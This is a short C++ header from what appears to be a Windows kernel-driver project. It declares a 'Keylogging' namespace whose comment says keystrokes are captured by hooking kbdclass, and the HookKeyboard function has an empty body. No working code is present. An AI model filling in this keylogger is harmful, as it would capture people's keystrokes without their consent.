#pragma once

#include <ntifs.h>

#include "IrpHook.h"

/*
	Keylogging functionality, implemented by kbdclass hook.
*/

namespace Keylogging {


	NTSTATUS HookKeyboard(PIO_COMPLETION_ROUTINE KeyboardHook) {

	}
}